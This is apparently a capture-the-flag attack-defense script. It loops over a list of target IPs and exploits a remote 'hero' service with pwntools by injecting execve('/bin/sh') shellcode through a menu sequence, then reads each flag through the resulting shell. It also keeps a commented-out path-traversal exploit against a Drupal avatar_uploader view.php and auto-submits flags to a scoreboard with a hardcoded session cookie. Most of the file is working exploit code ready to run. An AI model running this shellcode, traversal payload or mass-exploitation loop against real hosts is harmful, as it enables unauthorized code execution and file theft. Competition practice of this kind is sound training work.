#encoding:utf-8
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

MINUTE_PER_ROUND = 5  # min

SUBMIT_INTERVAL = 5  # sec
SUBMIT_TIMEOUT = 5  # sec
URL = 'http://172.91.1.12:9090/ad/hacker/submit/submitCode'
# SUBMIT_TOKEN = '8263a214aab63a0206dbbd8ae018d0c1'
COOKIES = {
    'JSESSIONID': '070F29ACC84904539D09FDFCFEFD2502'
}

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36',
    'Origin': 'http://172.91.1.12:9090',
    'Referer': 'http://172.91.1.12:9090/arace/index?'
}


# flag_ptn = re.compile(r'[\da-f]{8}-[\da-f]{4}-[\da-f]{4}-[\da-f]{4}-[\da-f]{12}', re.I)
# ----------------------------------------------------
# flags 标志位参数
# re.I(re.IGNORECASE)
# 使匹配对大小写不敏感
# re.L(re.LOCAL)
# 做本地化识别（locale-aware）匹配
# re.M(re.MULTILINE)
# 多行匹配，影响 ^ 和 $
# re.S(re.DOTALL)
# 使 . 匹配包括换行在内的所有字符
# re.U(re.UNICODE)
# 根据Unicode字符集解析字符。这个标志影响 \w, \W, \b, \B.
# re.X(re.VERBOSE)
# 该标志通过给予你更灵活的格式以便你将正则表达式写得更易于理解。
# ---------------------------------------------------
# from exp import get_flag
# def get_flag(ip):
#     url = 'http://' + ip + ':5072/sites/all/modules/avatar_uploader/lib/demo/view.php?file=../../../../../../../../../../../../../../../../../flag'
#     r = requests.get(url)
#     flag_mo = flag_ptn.search(r.text)
#     if flag_mo:
#         return flag_mo.group(0)
#     else:
#         return None

# get_flag 随机32位flag生成 hexdigits是字的选项
# def get_flag(ip):  # 实现获取flag
#     import random
#     hexdigits = '0123456789abcdef'
#     return ''.join(random.choice(hexdigits) for _ in range(32))


# 送分的题目
from pwn import *

def get_flag(ip,port=8089):
	payload = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

	#p = process("./hero")
	p = remote(ip,port, timeout=3)
	p.recvuntil("Your choice:")
	p.sendline("1")
	#raw_input("stop")
	p.sendline("1234")

	p.recvuntil("What's your hero's power:")
	p.sendline(payload)

	p.recvuntil("Your choice:")
	p.sendline("6")

	p.recvuntil("4. Divide two numbers")
	p.sendline("13")

	p.recvuntil("Please input two numbers to do math with")
	p.sendline("1 2")

	p.sendline("chmod flag -r")
	#p.interactive()
	p.recvline()
	flag = p.recvline()
	return flag

fp = open("ips", "r").readlines()[0]

for ip in fp.split(' '):
    flag = ""
    try:
        flag = get_flag(ip, 8089)
    except :
        continue

    print flag
    flag = flag.replace("\n", "")
    data = {'flag': flag}
    for i in range(3):
        r = requests.post(URL, data=data, headers=headers, timeout=SUBMIT_TIMEOUT, cookies=COOKIES,
                      verify=False)  # 提交flag的函数
        print r.content
        break
